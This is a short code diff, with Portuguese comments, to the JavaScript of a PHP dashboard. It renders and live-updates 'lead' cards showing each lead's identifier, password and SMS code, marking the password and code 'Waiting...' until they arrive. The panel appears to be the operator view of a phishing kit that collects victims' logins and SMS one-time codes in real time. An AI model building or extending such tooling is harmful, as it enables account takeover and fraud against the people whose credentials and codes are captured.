@@ -199,19 +199,24 @@ session_start();
 
                 leads.forEach(lead => {
                     if (!document.getElementById(`lead-${lead.id}`)) {
-                        // ... (código existente para criar o card) ...
+                        const cardClone = leadTemplate.content.cloneNode(true);
+                        const newCard = cardClone.querySelector('.lead-card');
+                        newCard.id = `lead-${lead.id}`;
+                        newCard.dataset.id = lead.id;
+                        
+                        newCard.querySelector('.lead-id').textContent = lead.id;
+                        newCard.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
+                        newCard.querySelector('.lead-identifier').textContent = lead.identificador;
                         newCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
-                        // ADICIONE ESTA LINHA
                         newCard.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
                         newCard.querySelector('.lead-status').textContent = lead.status;
-
+                        
                         leadsContainer.prepend(newCard);
                     } else {
-                        // Atualiza o status e outros campos se o card já existir
+                        // Atualiza o status se o card já existir
                         const existingCard = document.getElementById(`lead-${lead.id}`);
                         existingCard.querySelector('.lead-status').textContent = lead.status;
                         existingCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
-                        // ADICIONE ESTA LINHA TAMBÉM
                         existingCard.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
                     }
                 });
